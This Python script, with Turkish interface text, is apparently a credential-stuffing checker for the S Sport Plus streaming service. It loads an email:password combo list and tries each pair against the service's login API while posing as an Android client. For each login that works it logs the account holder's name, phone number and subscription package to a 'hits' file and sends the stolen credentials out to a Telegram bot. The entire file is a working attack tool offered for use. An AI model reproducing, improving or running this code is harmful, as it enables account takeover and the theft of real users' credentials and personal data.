import requests
import json
from datetime import datetime
from colorama import Fore, Style, init
from cfonts import render

# Initialize colors
init(autoreset=True)

# Create logo
logo = render('S SPORT', colors=['cyan', 'blue'], align='center')
print(logo)

# Telegram Configuration
TELEGRAM_BOT_TOKEN = input("🤖 Telegram Bot Token: ").strip()
TELEGRAM_CHAT_ID = input("💬 Telegram Chat ID: ").strip()

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}❌ Telegram gönderim hatası: {e}{Style.RESET_ALL}")

def check_account(email, password, bot_token):
    data = {
        "action": "SubscriberLogin",
        "subscriber": {
            "LoginPreferedMethod": 0,
            "UILanguage": "tr",
            "Email": email,
            "PIN": password
        },
        "Devices": [
            {
                "PlatformID": 10
            }
        ],
        "TSID": 1726074307
    }

    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "api.ssportplus.com",
        "SNGT": bot_token,
        "UILanguage": "tr",
        "User-Agent": "Android_Mobile/2.31.26"
    }

    try:
        response = requests.post(
            "https://api.ssportplus.com/mw/SubscriberLogin",
            headers=headers,
            json=data,
            timeout=15
        )
        content = response.text

        if "E-Posta adresinizi ve / veya Şifrenizi hatalı girdiniz" in content:
            print(f'{Fore.RED}[BAD] {email}:{password}{Style.RESET_ALL}')
            return False

        elif "SessionID" in content:
            subscriber = json.loads(content).get('subscriber', {})
            first_name = subscriber.get('FirstName', 'N/A')
            last_name = subscriber.get('LastName', 'N/A')
            phone = subscriber.get('PhoneNumber', 'Yok')
            package = subscriber.get('PackageName', 'Yok')
            auto_renew = subscriber.get('AutoRenew', False)
            
            # Console output
            print(f"\n{Fore.GREEN}🔥 YENİ HIT BULUNDU 🔥{Style.RESET_ALL}\n")
            print(f"{Fore.CYAN}📧 Email: {Fore.WHITE}{email}")
            print(f"{Fore.CYAN}🔑 Şifre: {Fore.WHITE}{password}")
            print(f"{Fore.CYAN}👤 Ad Soyad: {Fore.WHITE}{first_name} {last_name}")
            print(f"{Fore.CYAN}📞 Telefon: {Fore.WHITE}{phone}")
            print(f"{Fore.CYAN}📦 Paket: {Fore.WHITE}{package}")
            print(f"{Fore.CYAN}🔄 Otomatik Yenileme: {Fore.GREEN if auto_renew else Fore.RED}{'✔' if auto_renew else '❌'}")
            
            # Save to file
            with open('SSPORTPLUS_hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {first_name} {last_name} | {package}\n")
            
            # Telegram message
            telegram_msg = (
                f"<b>🔥 YENİ S SPORT HESABI BULUNDU 🔥</b>\n\n"
                f"<b>📧 Email:</b> <code>{email}</code>\n"
                f"<b>🔑 Şifre:</b> <code>{password}</code>\n"
                f"<b>👤 Ad Soyad:</b> {first_name} {last_name}\n"
                f"<b>📞 Telefon:</b> {phone}\n"
                f"<b>📦 Paket:</b> {package}\n"
                f"<b>🔄 Otomatik Yenileme:</b> {'✔' if auto_renew else '❌'}\n\n"
                f"<i>⌛ {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</i>"
            )
            send_to_telegram(telegram_msg)
            
            return True

        else:
            print(f'{Fore.YELLOW}[UNKNOWN RESPONSE] {email}:{password}{Style.RESET_ALL}')
            return False

    except Exception as e:
        print(f'{Fore.MAGENTA}[ERROR] {email}:{password} | Hata: {str(e)}{Style.RESET_ALL}')
        return False

def main():
    # Get bot token
    bot_token = input("🔑 S Sport API Token: ").strip()
    
    # Get combo file
    file_path = input("📁 Combo dosya yolu: ").strip()
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f if line.strip() and ':' in line]
    except Exception as e:
        print(f'{Fore.RED}❌ Dosya okuma hatası: {e}{Style.RESET_ALL}')
        return

    print(f'\n🔎 Toplam {len(accounts)} hesap bulundu\n')
    
    for account in accounts:
        try:
            email, password = account.split(':', 1)
            check_account(email, password, bot_token)
        except ValueError:
            print(f'{Fore.RED}❌ Geçersiz format: {account}{Style.RESET_ALL}')

if __name__ == '__main__':
    main()
